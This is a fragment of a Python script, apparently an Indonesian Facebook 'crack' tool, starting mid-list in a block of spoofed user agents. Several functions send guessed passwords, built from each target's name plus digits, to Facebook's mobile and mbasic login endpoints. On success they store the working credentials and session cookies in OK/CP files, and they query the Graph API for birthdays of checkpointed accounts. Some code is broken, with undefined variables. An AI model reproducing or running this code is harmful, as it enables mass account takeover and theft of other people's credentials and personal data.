'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2'
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 GSA/13.1.16.23.arm64'

])		
		ge=s.get(url+"/login/?next&ref=dbl&refid=8").text
		sop=parser(ge,"html.parser")
		for i in sop.find_all("raw_input"):
			if i.get("name")==None or "_fb_noscript" in i.get("name") or "sign_up" in i.get("name"):continue
			else:data.update({i.get("name"):i.get("value")})
		data.update({"email":uid,"pass":pw})
		log_in=url+sop.find("form",method="post").get("action")
		if "m.facebook.com" in url:
			s.headers.update({"Host":re.findall("//(.+)",url)[0],"x-fb-lsd":data.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		else:
			if "mbasic.facebook.com" in url:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
			else:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
		s.headers.update({"Host":re.findall("//(.+)",url)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":hea,"origin":url,"user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		po=s.post(log_in,data=data)
		if "c_user" in s.cookies.get_dict().keys():
			kukis = ";".join([e+"="+v for e,v in s.cookies.get_dict().items()])
			print("\r  %s\x1b[1;92m[OK] -> %s|%s|%s"%(H,uid, pw, kukis))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("   > %s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in s.cookies.get_dict().keys():
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s\x1b[1;92m[CP] -> %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("   > %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s\x1b[1;92m[CP] -> %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("   > %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobile(uid, pwx): # Code by : Khamdihi Xd
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 GSA/13.1.16.23.arm64")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasicv2(uid, pwx):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r[Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;92m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def khamdihi(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r[Crack] %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\x1b[1;92m[OK] %s | %s| %s"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\x1b[1;93m[CP] %s | %s        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
		loop += 1
	except:
		pass

# Jangan di ganti ngentod
def nunu(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r[crack] %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;94m[AWAIS-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[FLAME-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
		loop += 1
	except:
		pass

if __name__ == '__main__':
   os.system('git pull')
   os.system('clear')
   raw_input('[✓] Gunakan metode yang di rekomendasikan ! ')
   print('[ enter ]')
   os.system('clear')
   menu()
